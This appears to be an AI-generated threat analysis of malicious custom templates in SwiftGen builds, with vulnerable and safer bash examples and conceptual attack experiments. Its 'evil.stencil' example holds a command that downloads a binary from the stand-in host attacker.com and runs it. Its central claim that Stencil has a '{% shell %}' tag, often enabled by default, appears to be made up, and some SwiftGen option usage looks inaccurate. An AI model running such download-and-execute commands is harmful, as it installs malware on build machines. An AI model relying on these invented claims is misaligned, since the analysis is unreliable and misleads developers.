Okay, let's craft a deep analysis of the "Malicious Custom Templates (Command-Line Injection)" attack surface for a SwiftGen-using application.

## Deep Analysis: Malicious Custom Templates in SwiftGen

### 1. Define Objective, Scope, and Methodology

**Objective:**

The primary objective of this deep analysis is to thoroughly understand the risks associated with the "Malicious Custom Templates" attack surface in SwiftGen, identify specific vulnerabilities, and propose concrete, actionable mitigation strategies beyond the high-level overview already provided.  We aim to provide developers with practical guidance to secure their SwiftGen integration.

**Scope:**

This analysis focuses specifically on the attack vector where an attacker can manipulate SwiftGen's command-line arguments, particularly `--templatePath` (and related options like `--templateName` if a template directory is used), to execute arbitrary code via malicious Stencil templates.  We will consider:

*   The context of CI/CD pipelines and local development environments.
*   The interaction between SwiftGen and the underlying operating system.
*   The capabilities of the Stencil templating language itself.
*   Potential bypasses of common mitigation techniques.

**Methodology:**

1.  **Threat Modeling:**  We'll use a threat modeling approach to identify potential attack scenarios and attacker motivations.
2.  **Code Review (Hypothetical):**  While we don't have access to a specific application's codebase, we'll simulate a code review by analyzing common SwiftGen integration patterns and identifying potential weaknesses.
3.  **Experimentation (Conceptual):** We'll conceptually outline experiments that could be performed to validate the attack surface and test mitigation strategies.  This will involve describing how to craft malicious templates and attempt to inject them.
4.  **Best Practices Research:** We'll leverage established security best practices for CI/CD, input validation, and least privilege to formulate robust recommendations.
5.  **Mitigation Analysis:** We will analyze the effectiveness and limitations of each proposed mitigation strategy.

### 2. Deep Analysis of the Attack Surface

**2.1 Threat Modeling:**

*   **Attacker Profile:**
    *   **External Attacker:**  Gains access to the CI/CD pipeline (e.g., through compromised credentials, a vulnerability in the CI/CD platform, or a supply chain attack on a CI/CD dependency).
    *   **Internal Attacker (Malicious Insider):** A developer or someone with access to the codebase or build configuration intentionally introduces a malicious template.
    *   **Compromised Developer Machine:** An attacker gains control of a developer's machine and modifies local build scripts or configuration files.

*   **Attack Scenarios:**
    *   **CI/CD Pipeline Poisoning:** The attacker modifies the build script in the CI/CD pipeline to use a malicious template hosted on a remote server or injected directly into the script.  This is the most likely and dangerous scenario.
    *   **Local Build Manipulation:**  The attacker modifies the build script or configuration on a developer's machine.  This is less likely to affect the final product but could compromise the developer's environment.
    *   **Dependency Hijacking:** An attacker compromises a legitimate SwiftGen template repository and replaces a valid template with a malicious one. This is a supply chain attack.

*   **Attacker Motivations:**
    *   **Data Exfiltration:** Steal sensitive information (API keys, credentials) embedded in the generated code or accessible during the build process.
    *   **Backdoor Installation:**  Embed a backdoor into the application to gain persistent access.
    *   **Code Modification:**  Alter the application's functionality to introduce vulnerabilities or malicious behavior.
    *   **Build Environment Compromise:**  Use the build server as a launching point for further attacks on the network.
    *   **Cryptocurrency Mining:**  Use the build server's resources for cryptocurrency mining.

**2.2 Code Review (Hypothetical):**

Let's examine some common (and potentially vulnerable) SwiftGen integration patterns:

**Vulnerable Example 1 (User Input):**

```bash
#  DANGEROUS:  Takes template path from user input.
read -p "Enter template path: " template_path
swiftgen config run --templatePath "$template_path"
```

This is extremely dangerous.  An attacker could provide a path to a malicious template, or even use path traversal (`../../evil.stencil`) to access files outside the intended directory.

**Vulnerable Example 2 (Unvalidated Environment Variable):**

```bash
#  DANGEROUS:  Uses an environment variable without validation.
swiftgen config run --templatePath "$TEMPLATE_PATH"
```

If the `TEMPLATE_PATH` environment variable is not properly sanitized and validated, an attacker who can control the environment (e.g., in a compromised CI/CD pipeline) can inject a malicious path.

**Vulnerable Example 3 (Relative Path):**

```bash
#  DANGEROUS:  Uses a relative path.
swiftgen config run --templatePath "templates/my_template.stencil"
```
While seemingly less dangerous, relative paths can still be problematic. If the working directory of the build process is changed unexpectedly (e.g., due to a misconfiguration or another vulnerability), the relative path might point to an unintended location, potentially a malicious template.

**Vulnerable Example 4 (Hardcoded, but externally hosted):**
```bash
# DANGEROUS: Uses a hardcoded, but externally hosted template.
swiftgen config run --templatePath "https://example.com/my_template.stencil"
```
This is vulnerable to a MITM attack or if the `example.com` server is compromised.

**Safer Example (Absolute Path, Whitelisted):**

```bash
#  SAFER:  Uses an absolute path and a whitelist.
TEMPLATE_PATH="/path/to/approved/templates/my_template.stencil"

#  Whitelist check (simplified example).  A more robust solution
#  would use a dedicated configuration file or a more secure mechanism.
ALLOWED_PATHS=(
  "/path/to/approved/templates/my_template.stencil"
  "/path/to/approved/templates/another_template.stencil"
)

if [[ ! " ${ALLOWED_PATHS[*]} " =~ " ${TEMPLATE_PATH} " ]]; then
  echo "ERROR: Invalid template path."
  exit 1
fi

swiftgen config run --templatePath "$TEMPLATE_PATH"
```

This is significantly better.  It uses an absolute path, making it less susceptible to working directory changes.  The whitelist provides an extra layer of defense, ensuring that only pre-approved templates can be used.

**2.3 Experimentation (Conceptual):**

**Experiment 1: Crafting a Malicious Template:**

We can create a Stencil template that executes arbitrary shell commands.  Stencil's `{% shell %}` tag (if enabled, which it often is by default) is the key to this.

```stencil
// evil.stencil
{% shell "echo 'Hello from malicious template!' > /tmp/malicious_output.txt" %}
{% shell "curl http://attacker.com/malware -o /tmp/malware && chmod +x /tmp/malware && /tmp/malware" %}
// ... rest of the template (potentially disguised as a legitimate template) ...
```

This template would:

1.  Create a file `/tmp/malicious_output.txt` to demonstrate successful command execution.
2.  Download a hypothetical malware executable from `attacker.com`, make it executable, and run it.

**Experiment 2: Injecting the Template:**

We would then attempt to inject this template using various methods:

*   **CI/CD Manipulation:** Modify a `.gitlab-ci.yml`, `.github/workflows/*.yml`, `Jenkinsfile`, or similar CI/CD configuration file to use `--templatePath /path/to/evil.stencil`.
*   **Local Script Modification:**  Change a local build script to use the malicious template.
*   **Environment Variable Injection:**  Set the `TEMPLATE_PATH` environment variable to point to the malicious template.

**Experiment 3: Testing Mitigations:**

We would then test the effectiveness of the mitigation strategies:

*   **Whitelist Validation:**  Verify that the whitelist correctly blocks attempts to use unauthorized template paths.
*   **Input Sanitization:**  Test various path traversal and injection attempts to ensure that the sanitization logic is robust.
*   **Least Privilege:**  Run the build process with a user account that has minimal permissions and verify that the malicious template cannot perform privileged actions (e.g., writing to system directories).
